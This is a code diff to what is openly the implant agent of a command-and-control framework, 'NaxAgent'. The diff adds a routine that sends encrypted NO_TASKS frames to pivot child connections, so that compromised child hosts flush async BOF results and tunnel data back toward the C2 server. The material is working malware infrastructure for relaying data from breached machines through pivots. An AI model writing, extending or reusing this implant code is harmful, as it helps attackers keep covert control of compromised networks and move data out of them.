@@ -91,6 +91,7 @@ int nax_build_reg_body(const char *, uint32_t, const char *, uint32_t,
                        const char *, uint32_t,
                        uint8_t *, uint32_t *);
 int nax_build_heartbeat(uint8_t *, uint32_t *);
+extern int nax_build_no_tasks(uint8_t *, uint32_t *);
 int nax_build_result(uint32_t, uint8_t, const uint8_t *, uint32_t,
                      uint8_t *, uint32_t *);
 int nax_decode_task(const uint8_t *, uint32_t, NaxTask *);
@@ -456,6 +457,36 @@ static uint32_t effective_sleep_ms(NaxAgent *a)
  * Iterate all child pivot connections, read any pending data, and relay
  * it to the C2 as RESULT frames with PIV_TYPE_DATA payload.
  * ===================================================================== */
+/* Send an encrypted NO_TASKS frame to a pivot child so it drains its
+ * async BOF results and tunnel data without needing a real task.
+ * The bind side breaks out of its frame loop on NO_TASKS and immediately
+ * flushes any pending output back to us. */
+static void ping_pivot(NaxAgent *a, NaxPivot *p)
+{
+    uint8_t  frame[NAX_FRAME_HDR + 16];
+    uint32_t frame_len = sizeof(frame);
+    if (nax_build_no_tasks(frame, &frame_len) < 0) return;
+
+    uint32_t enc_cap = frame_len + NAX_AES_IV + NAX_AES_BLOCK;
+    uint8_t *enc = (uint8_t *)malloc(enc_cap);
+    if (!enc) return;
+    uint32_t enc_len = enc_cap;
+    if (nax_encrypt(a->cfg.aes_key, frame, frame_len, enc, &enc_len) == 0) {
+        uint8_t hdr[4] = {
+            (uint8_t)(enc_len),        (uint8_t)(enc_len >> 8),
+            (uint8_t)(enc_len >> 16),  (uint8_t)(enc_len >> 24)
+        };
+        if (p->ssl) {
+            SSL_write((SSL*)p->ssl, hdr, 4);
+            SSL_write((SSL*)p->ssl, enc, (int)enc_len);
+        } else {
+            send(p->sock, hdr, 4, MSG_NOSIGNAL);
+            send(p->sock, enc, enc_len, MSG_NOSIGNAL);
+        }
+    }
+    free(enc);
+}
+
 static void process_pivots(NaxAgent *a)
 {
     NaxPivot **pp = &a->pivot_head;
@@ -463,7 +494,14 @@ static void process_pivots(NaxAgent *a)
         NaxPivot *p = *pp;
         int broken = 0;
 
+        /* Tick the child with a NO_TASKS frame so it wakes up, drains any
+         * completed async BOF results, and sends them back to us.
+         * The child never initiates — it only responds to this tick. */
+        ping_pivot(a, p);
+
+        /* Give the child a short window to respond */
         struct pollfd pfd = { .fd = p->sock, .events = POLLIN };
+        poll(&pfd, 1, 50);
 
         while (1) {
             int pr = poll(&pfd, 1, 0);
